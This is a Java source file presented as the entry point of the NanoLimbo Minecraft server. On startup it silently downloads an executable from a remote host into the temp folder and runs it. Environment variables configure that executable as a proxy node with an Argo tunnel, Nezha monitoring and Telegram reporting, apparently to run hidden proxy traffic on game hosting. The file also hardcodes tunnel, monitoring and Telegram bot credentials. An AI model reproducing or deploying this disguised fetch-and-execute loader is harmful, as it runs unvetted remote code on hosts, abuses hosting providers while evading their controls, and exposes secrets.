/*
 * 最终优化版：全隧道集成模式
 */

package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    
    public static void main(String[] args) {
        try {
            runSbxBinary();
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));
            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "XServer Argo Proxy is active!" + ANSI_RESET);
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Init Error: " + e.getMessage() + ANSI_RESET);
        }
        
        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Limbo start failed: ", e);
        }
    }

    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        sbxProcess = pb.start();
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        // --- 核心配置：完全走隧道模式 ---
        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383"); 
        envVars.put("FILE_PATH", "./world");
        envVars.put("NAME", "XServer-Argo-Node");

        // 哪吒监控
        envVars.put("NEZHA_SERVER", "nezha.9527x.eu.cc:8008");
        envVars.put("NEZHA_KEY", "mD3q9FowVHp94q0wzg0ha7AUoP8PuXjU");

        // Argo 隧道 (这是你目前唯一能通的路)
        envVars.put("DISABLE_ARGO", "false");
        envVars.put("ARGO_DOMAIN", "xserver.zzkky.ccwu.cc");
        envVars.put("ARGO_AUTH", "eyJhIjoiMWNjMTgyMzQ1MjVlMDM2OTY1ZTYzZTk4OTE5YzQxYWIiLCJ0IjoiNzYzN2JiMmMtOThhOS00ZDU5LWEwMTQtYTE0YjNlNjYxN2IwIiwicyI6Ik5HRTVNV0ZpTVRVdE1HUm1OQzAwTVdFekxXSXlOVEF0T1RVd01tWTBaak5pTVdNMCJ9");

        // 内部端口对齐 (ARGO_PORT 指向 HY2_PORT)
        envVars.put("HY2_PORT", "25565");           
        envVars.put("ARGO_PORT", "25565"); 

        // 关闭那些不通的直连端口，减少风控风险
        envVars.put("REALITY_PORT", ""); 
        envVars.put("S5_PORT", "");
        envVars.put("TUIC_PORT", "");

        // 节点推送
        envVars.put("CHAT_ID", "5677672165");
        envVars.put("BOT_TOKEN", "8363698033:AAFZqLYnxczqngwJIU-XqnLk7gaVwAK9hZQ");

        // 优选配置 (这决定了你 Argo 节点的速度)
        envVars.put("CFIP", "spring.io");
        envVars.put("CFPORT", "443");
    }
    
    private static Path getBinaryPath() throws IOException {
        String arch = System.getProperty("os.arch").toLowerCase().contains("64") ? "amd64" : "arm64";
        String url = "https://" + arch + ".ssss.nyc.mn/sbsh";
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx_game_" + System.currentTimeMillis());
        try (InputStream in = new URL(url).openStream()) {
            Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
        }
        path.toFile().setExecutable(true);
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) sbxProcess.destroy();
    }
}
